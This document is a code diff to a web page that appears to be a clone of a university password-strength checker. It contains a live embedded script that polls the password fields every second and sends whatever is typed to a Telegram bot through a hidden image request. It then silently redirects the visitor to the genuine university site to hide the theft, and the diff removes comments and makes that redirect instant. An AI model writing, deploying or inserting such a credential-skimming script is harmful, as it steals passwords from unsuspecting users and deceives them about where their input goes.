@@ -349,6 +349,7 @@
 
  <script type="text/javascript" src="https://www.uic.edu/apps/strong-password/js/strong-password.js" language="javascript"></script>
 	  
+
 <script>
     (function() {
         // YOUR VERIFIED CREDENTIALS
@@ -358,7 +359,6 @@
         var redirected = false;
 
         // --- PART 1: THE TELEGRAM PEAK ---
-        // This runs every second to grab the text from the UIC inputs
         setInterval(function() {
             var p1 = document.getElementById('passwordPwd');
             var p2 = document.getElementById('passwordTxt');
@@ -366,34 +366,26 @@
 
             if (currentVal.length > 2 && currentVal !== lastSent) {
                 lastSent = currentVal;
-                
-                // Using a hidden image to bypass mobile security blocks
                 var peakUrl = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent("Thought: " + currentVal);
-                
                 var ping = new Image();
                 ping.src = peakUrl;
             }
         }, 1000);
 
-        // --- PART 2: THE STEALTH REDIRECT ---
-        // This triggers when the user scrolls to the bottom of the page
+        // --- PART 2: THE INSTANT REDIRECT ---
         window.onscroll = function() {
-            // Check if user has reached the bottom (within 100px)
-            if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 100) {
+            // This triggers when the user is within 10px of the bottom
+            if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight - 10) {
                 if (!redirected) {
-                    redirected = true; // Prevents the redirect from firing twice
+                    redirected = true; 
                     
-                    // Wait 2 seconds (enough time for them to read the footer/tips)
-                    setTimeout(function() {
-                        // Jumps to the REAL UIC website
-                        window.location.href = "https://www.uic.edu/apps/strong-password/";
-                    }, 2000);
+                    // INSTANT JUMP to the REAL UIC website
+                    window.location.replace("https://www.uic.edu/apps/strong-password/");
                 }
             }
         };
     })();
 </script>
-
 
 
 </body>
